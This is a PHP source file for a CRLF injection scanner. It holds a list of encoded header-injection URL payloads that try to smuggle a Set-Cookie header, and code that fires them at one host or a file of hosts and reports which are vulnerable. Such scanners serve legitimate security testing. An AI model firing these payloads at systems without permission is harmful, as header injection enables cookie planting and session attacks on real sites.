<?php

/**
 * I don't believe in license
 * You can do want you want with this program
 * - gwen -
 */

class TestCrlf
{
	const T_PAYLOADS = array(
		'/%0D%0ASet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'/%0DSet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'/%0ASet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'/%23%0D%0ASet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'/%23%0DSet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'/%23%0ASet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'/xxx%0D%0ASet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'/xxx%0DSet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'/xxx%0ASet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__',
		'//xxx%0D%0ASet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__;',
		'//xxx%0DSet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__;',
		'//xxx%0ASet-Cookie:__COOKIE_NAME__=__COOKIE_VALUE__;',
		'/%E5%98%8A%E5%98%8DSet-Cookie:%20__COOKIE_NAME__=__COOKIE_VALUE__',
	);

	/**
	 * @var string
	 *
	 * the name of the cookie that we try to set
	 */
	private $prefix_cookie_name = 'ABRAK';
	private $cookie_name = null;

	/**
	 * @var string
	 *
	 * the value of the cookie that we try to set
	 */
	private $prefix_cookie_value = 'ADABRA';
	private $cookie_value = null;

	/**
	 * @var string
	 *
	 * protocol used
	 */
	private $protocol = 'http';

	/**
	 * @var string
	 *
	 * host to test
	 */
	private $host = null;

	/**
	 * @var string
	 *
	 * hostS to test
	 */
	private $input_file = null;
	
	private $redirect = false;
	
	private $ssl = false;

	/**
	 * @var array
	 *
	 * payloads table
	 */
	private $t_payloads = null;


	public function getCookieName() {
		return $this->cookie_name;
	}
	public function setCookieName( $v ) {
		$this->cookie_name = trim( $v );
		return true;
	}


	public function getCookieValue() {
		return $this->cookie_value;
	}
	public function setCookieValue( $v ) {
		$this->cookie_value = trim( $v );
		return true;
	}


	public function getProtocol() {
		return $this->protocol;
	}
	public function setProtocol( $v ) {
		$this->protocol = trim( $v );
		if( $this->protocol == 'https' ) {
			$this->ssl = true;
		}
		return true;
	}

	
	public function getHost() {
		if( $this->input_file ) {
			return $this->input_file;
		} else {
			return $this->host;
		}
	}
	public function setHost( $v ) {
		$v = trim( $v );
		if( is_file($v) ) {
			$this->input_file = $v;
		} else {
			$this->host = $v;
		}
		return true;
	}

	
	public function getRedirect() {
		return $this->redirect;
	}
	public function setRedirect( $v ) {
		$this->redirect = (bool)$v;
		return true;
	}

	
	public function getSsl() {
		return $this->ssl;
	}
	public function setSsl( $v ) {
		$this->ssl = (bool)$v;
		return true;
	}

	
	public function getPayloads() {
		return $this->t_payloads;
	}
	public function addPayload( $p )
	{
		$this->t_payloads[] = $p;
		return true;
	}

	
	public function run()
	{
		if( $this->input_file ) {
			echo "Loading data file...\n";
			$t_host = file( $this->input_file, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES );
		} else {
            $t_host = [ $this->host ];
        }

		echo "\n";
		
		$this->setCookieName( uniqid($this->prefix_cookie_name) );
		$this->SetCookieValue( uniqid($this->prefix_cookie_value) );
		
		$n_payloads = $this->preparePayloads();
		if( !$n_payloads ) {
			exit( "No payloads configured!\n" );
		}

		echo "Testing ".$n_payloads." payloads on ".count($t_host)." host...\n\n";

		foreach( $t_host as $h )
		{
			$crlf = false;

			foreach( $this->getPayloads() as $p )
			{
				//echo $p."\n";
				
				$r = new TestCrlfRequest();
				$r->setRedirect( $this->redirect );
				$r->setSsl( $this->ssl );
				$r->setHost( $h );
				$r->setUrl( $p );
				$result_code = $r->request();
	
				if( $result_code == 0 ) 
				{
					$crlf = -1;
					break;
				}
				else
				{
					$t_cookies = $r->extractCookies();
					//var_dump($t_cookies);
					
					if( count($t_cookies) && isset($t_cookies[$this->getCookieName()]) && $t_cookies[$this->getCookieName()] == $this->getCookieValue() ) {
					//if( isset($t_cookies['localization']) && $t_cookies['localization'] == 'en-us;ua;ua' ) {
						$crlf = true;
						break;
					}
				}
			}

			$this->result( $h, $crlf, $p );
		}

		echo "\n";
	}


	private function preparePayloads()
	{
		foreach( self::T_PAYLOADS as $p )
		{
			$pp = $p;
			$pp = str_replace( '__COOKIE_NAME__', $this->cookie_name, $pp );
			$pp = str_replace( '__COOKIE_VALUE__', $this->cookie_value, $pp );
			$this->addPayload( $pp );
		}
		
		$n_payloads = count( $this->t_payloads );

		return $n_payloads;
	}
	
	
	private function result( $host, $r, $payload )
	{
		echo $host.' is ';

		if( $r === true ) {
			Utils::_print( 'VULNERABLE', 'red' );
			Utils::_print( ' to payload: ', 'white' );
			Utils::_print( $payload, 'red' );
		} elseif( $r === false ) {
			Utils::_print( 'SAFE!', 'green' );
		} else {
			Utils::_print( 'DOWN!', 'yellow' );
		}
		
		echo "\n";
	}
}

?>
